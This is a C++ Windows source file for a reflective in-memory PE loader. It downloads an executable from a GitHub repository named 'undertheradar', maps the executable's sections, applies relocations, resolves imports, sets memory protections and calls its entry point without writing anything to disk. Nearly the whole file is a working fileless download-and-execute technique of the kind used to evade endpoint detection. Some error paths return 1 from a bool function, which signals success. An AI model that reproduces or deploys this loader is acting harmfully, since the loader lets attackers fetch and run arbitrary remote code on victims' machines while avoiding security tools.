#include <Windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")

struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
};

//bool LoadPEInMemory(const std::string& pePath) {
bool LoadPEInMemory(){
    // Step 1: Load PE from disk
   /*
    HANDLE hFile = CreateFileA(pePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Cannot open PE file\n";
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileBuffer(fileSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, fileBuffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    */

    const char* agent = "Mozilla/5.0";
    const char* url = "https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/putty.exe";

    // ---- Open Internet session ----
    HINTERNET hInternet = InternetOpenA(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpenA failed: " << GetLastError() << "\n";
        return 1;
    }

    // ---- Open URL ----
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        std::cerr << "InternetOpenUrlA failed: " << GetLastError() << "\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    // ---- Read shellcode into memory ----
    //std::vector<char> data;
    std::vector<BYTE> fileBuffer;
    char chunk[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead > 0) {
        fileBuffer.insert(fileBuffer.end(), chunk, chunk + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (fileBuffer.empty()) {
        std::cerr << "[-] Failed to download data.\n";
        return 1;
    }


    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer.data();
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer.data() + dosHeader->e_lfanew);

    // Step 2: Allocate memory for image
    BYTE* imageBase = (BYTE*)VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!imageBase) {
        std::cerr << "[!] VirtualAlloc failed\n";
        return false;
    }

    // Step 3: Copy headers
    memcpy(imageBase, fileBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders);

    // Step 4: Map sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    std::cout << "[INFO] Mapping " << ntHeaders->FileHeader.NumberOfSections << " sections...\n";
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
        // Get section name (8 bytes, null-terminated)
        char sectionName[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };
        strncpy_s(sectionName, reinterpret_cast<const char*>(section->Name), IMAGE_SIZEOF_SHORT_NAME);

        // Calculate source and destination addresses
        BYTE* dest = imageBase + section->VirtualAddress;
        BYTE* src = fileBuffer.data() + section->PointerToRawData;

        // Print section details
        std::cout << "[INFO] Mapping section " << i + 1 << " (" << sectionName << "):\n"
            << "  - Source offset in file: 0x" << std::hex << section->PointerToRawData << "\n"
            << "  - Destination address: 0x" << std::hex << reinterpret_cast<uintptr_t>(dest) << "\n"
            << "  - Size: " << std::dec << section->SizeOfRawData << " bytes\n";

        // Copy section data
        memcpy(dest, src, section->SizeOfRawData);

        // Confirm mapping
        std::cout << "[INFO] Section " << sectionName << " mapped successfully.\n";
    }

    // Step 5: Apply relocations if loaded at different base
    ULONGLONG delta = (ULONGLONG)(imageBase - ntHeaders->OptionalHeader.ImageBase);
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            BYTE* relocBase = imageBase + relocDir->VirtualAddress;
            DWORD parsed = 0;
            while (parsed < relocDir->Size) {
                PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)(relocBase + parsed);
                DWORD blockSize = relocBlock->SizeOfBlock;
                DWORD numEntries = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
                USHORT* entries = (USHORT*)(relocBlock + 1);

                for (DWORD i = 0; i < numEntries; ++i) {
                    USHORT typeOffset = entries[i];
                    USHORT type = typeOffset >> 12;
                    USHORT offset = typeOffset & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* patchAddr = (ULONGLONG*)(imageBase + relocBlock->VirtualAddress + offset);
                        *patchAddr += delta;
                    }
                }
                parsed += blockSize;
            }
        }
    }

    // Step 6: Resolve imports
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    std::cout << "[INFO] Import directory: VirtualAddress=0x" << std::hex << importDir->VirtualAddress
        << ", Size=" << std::dec << importDir->Size << " bytes\n";
    if (importDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importDir->VirtualAddress);
        while (importDesc->Name != 0) {
            char* dllName = (char*)(imageBase + importDesc->Name);
            std::cout << "[INFO] Loading DLL: " << dllName << "\n";
            HMODULE hModule = LoadLibraryA(dllName);
            if (!hModule) {
                std::cerr << "[!] Failed to load " << dllName << "\n";
                return false;
            }
            std::cout << "[INFO] DLL " << dllName << " loaded successfully at handle 0x" << std::hex << reinterpret_cast<uintptr_t>(hModule) << "\n";

            PIMAGE_THUNK_DATA64 origFirstThunk = (PIMAGE_THUNK_DATA64)(imageBase + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)(imageBase + importDesc->FirstThunk);

            int functionCount = 0;
            while (origFirstThunk->u1.AddressOfData != 0) {
                FARPROC proc = nullptr;
                if (origFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    WORD ordinal = origFirstThunk->u1.Ordinal & 0xFFFF;
                    std::cout << "[INFO] Resolving function by ordinal: #" << std::dec << ordinal << "\n";
                    proc = GetProcAddress(hModule, (LPCSTR)ordinal);
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + origFirstThunk->u1.AddressOfData);
                    std::cout << "[INFO] Resolving function by name: " << importByName->Name << "\n";
                    proc = GetProcAddress(hModule, importByName->Name);
                }
                if (proc) {
                    std::cout << "[INFO] Function resolved, address: 0x" << std::hex << reinterpret_cast<uintptr_t>(proc)
                        << ", writing to IAT at 0x" << reinterpret_cast<uintptr_t>(&firstThunk->u1.Function) << "\n";
                    firstThunk->u1.Function = (ULONGLONG)proc;
                    functionCount++;
                }
                else {
                    std::cerr << "[!] Failed to resolve function\n";
                }
                ++origFirstThunk;
                ++firstThunk;
            }
            std::cout << "[INFO] Resolved " << std::dec << functionCount << " functions for DLL " << dllName << "\n";
            ++importDesc;
        }
        std::cout << "[INFO] All imports resolved successfully.\n";
    }
    else {
        std::cout << "[INFO] No imports to resolve (import directory empty).\n";
    }

    // Step 7: Change section memory protection
    section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
        DWORD protect = 0;
        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (section->Characteristics & IMAGE_SCN_MEM_READ) protect = PAGE_EXECUTE_READ;
            if (section->Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;
        }
        else {
            if (section->Characteristics & IMAGE_SCN_MEM_READ) protect = PAGE_READONLY;
            if (section->Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
        }
        DWORD oldProtect;
        VirtualProtect(imageBase + section->VirtualAddress, section->Misc.VirtualSize, protect, &oldProtect);
    }

    // Step 8: Call entry point
    DWORD_PTR entry = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    auto entryPoint = (void(*)())entry;
    entryPoint();

    return true;
}

int main() {
    std::cout << "[INFO] Loading PE in memory...\n";
   
    if (!LoadPEInMemory()) {
        std::cerr << "[!] Failed to load PE\n";
    }
    return 0;
}
